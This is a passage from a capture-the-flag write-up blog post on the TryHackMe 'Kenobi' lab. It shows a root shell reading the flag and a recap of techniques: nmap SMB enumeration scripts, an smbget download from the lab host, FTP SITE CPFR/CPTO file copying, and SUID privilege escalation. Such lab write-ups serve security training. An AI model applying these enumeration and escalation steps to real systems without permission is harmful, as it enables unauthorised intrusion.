root@kenobi:/tmp# <span class="nb">cat</span> /root/root.txt
</pre></table></code></div></div><blockquote><p>When you do PATH changes <strong>PLEASE REMEMBER THE OLD</strong> one for change it back.</p></blockquote><p>### <strong>Task 4.1 - 4.4 solved</strong> ###</p><p><a href="https://www.c-ville.com/wp-content/uploads/2013/04/Root-the-box-660x335.jpg" rel="follow"><left><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/thm-images/root.jpg" /></left></a></p><h2><ins>What we learned:</ins></h2><ol><li>Nmap simple port scan with get a port list with grep,awk etc…<li>Samba enumeration <code class="language-plaintext highlighter-rouge">nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse</code><li>Samba download <code class="language-plaintext highlighter-rouge">smbget -R smb://10.10.248.210/anonymous</code><li>SITE CPFR and SITE CPTO commands<li>SUID Priv Escalation</ol><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>tryhackme</a>, <a href='/categories/kenobi/'>kenobi</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackeme/" class="post-tag no-text-decoration" >TryHackeMe</a> <a href="/tags/%2C/" class="post-tag no-text-decoration" >,</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/%2C/" class="post-tag no-text-decoration" >,</a> <a href="/tags/nmap/" class="post-tag no-text-decoration" >nmap</a> <a href="/tags/%2C/" class="post-tag no-text-decoration" >,</a> <a href="/tags/suid/" class="post-tag no-text-decoration" >SUID</a> <a href="/tags/%2C/" class="post-tag no-text-decoration" >,</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Kenobi on Tryhackme - Zebra Blog&url=http://localhost:4000/categories/tryhackme/kenobi" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Kenobi on Tryhackme - Zebra Blog&u=http://localhost:4000/categories/tryhackme/kenobi" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Kenobi on Tryhackme - Zebra Blog&url=http://localhost:4000/categories/tryhackme/kenobi" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/,/">,</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/tryhackeme/">TryHackeMe</a> <a class="post-tag" href="/tags/blog/">Blog</a> <a class="post-tag" href="/tags/cronjob/">cronjob</a> <a class="post-tag" href="/tags/cyberchef/">cyberchef</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/news/">News</a> <a class="post-tag" href="/tags/smb/">smb</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/categories/tryhackme/easypeasy"><div class="card-body"> <span class="timeago small" > Oct 27 <i class="unloaded">2020-10-27T09:22:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>EasyPeasy on Tryhackme</h3><div class="text-muted small"><p> THM EasyPeasy Link EasyPeasy WriteUp by Zebra Room Date Difficulty Type Tags Time Own Intention Easypeasy 27.10.2020...</p></div></div></a></div><div class="card"> <a href="/categories/news"><div class="card-body"> <span class="timeago small" > Oct 28 <i class="unloaded">2020-10-28T20:22:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Done! Complete Beginner Path</h3><div class="text-muted small"><p> I made it "Complete Beginner Path" I proud about the comletion of the "Complete Beginner Path" on Tryhackme.</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/categories/news" class="btn btn-outline-primary"><p>Done! Complete Beginner Path</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com">zebra</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/,/">,</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/tryhackeme/">TryHackeMe</a> <a class="post-tag" href="/tags/blog/">Blog</a> <a class="post-tag" href="/tags/cronjob/">cronjob</a> <a class="post-tag" href="/tags/cyberchef/">cyberchef</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/news/">News</a> <a class="post-tag" href="/tags/smb/">smb</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
